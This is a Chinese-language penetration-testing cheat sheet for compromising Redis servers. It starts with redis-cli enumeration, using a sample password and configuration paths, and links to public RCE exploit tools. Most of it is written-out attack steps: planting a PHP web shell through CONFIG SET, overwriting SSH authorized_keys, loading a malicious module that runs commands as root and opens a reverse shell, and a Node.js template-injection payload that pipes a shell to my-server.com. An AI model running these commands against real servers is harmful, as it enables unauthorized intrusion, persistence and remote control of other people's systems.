默认情况下，Redis 可以在没有凭据的情况下访问。但是，它可以配置为仅支持密码，或用户名 + 密码。
可以在 redis.conf 文件中使用参数 requirepass 设置密码，或者在服务重新启动时连接并运行 config set requirepass p@ss$12E45 。
另外，用户名可以在 redis.conf 文件中的参数 masteruser 中配置。
如果只配置了密码，则使用的用户名是“default”。

**/etc/systemd/system/redis.service  --> 可写目录揭示**
**/etc/redis/redis.conf --> 配置文件(AUTH crediential)**
```bash
redis-cli -h <ip>
redis-cli -h 192.168.120.85 -a Ready4Redis?
>info
>AUTH <username> <password>
>client list
>CONFIG GET *
```

# RCE
## Exploit
[redis-rogue-server <=5.0.5](https://github.com/n0b0dyCN/redis-rogue-server)
[Redis RCE - 4.\*/5.\*](https://github.com/Ridter/redis-rce?source=post_page-----88a3e0e21f62--------------------------------)
## WebShell
```bash
config set dir /usr/share/nginx/html
10.85.0.52:6379> config set dbfilename redis.php
10.85.0.52:6379> set shell "<?php echo system($_GET['cmd']); ?>"
10.85.0.52:6379> save
```
### payload - html template
```html
{{ ({}).constructor.constructor(
  "var net = global.process.mainModule.require('net'),
       cp = global.process.mainModule.require('child_process'),
       sh = cp.spawn('sh', []);
   var client = new net.Socket();
   client.connect(1234, 'my-server.com', function(){
      client.pipe(sh.stdin);
      sh.stdout.pipe(client);
      sh.stderr.pipe(client);
   });"
)()}}
```
## SSH
```bash
root@Urahara:~# redis-cli -h 10.85.0.52
config get dir
10.85.0.52:6379> config set dir /var/lib/redis/.ssh
10.85.0.52:6379> config set dbfilename "authorized_keys"
10.85.0.52:6379> save
```
## Loading Redis Module
1. Create a Exploit.so: https://github.com/n0b0dyCN/RedisModules-ExecuteCommand
2. upload to target system.
```bash
MODULE LOAD /path/to/mymodule.so
MODULE LIST

127.0.0.1:6379> system.exec "id"
"uid=0(root) gid=0(root) groups=0(root)\n"
127.0.0.1:6379> system.exec "whoami"
"root\n"
127.0.0.1:6379> system.rev 127.0.0.1 9999
```
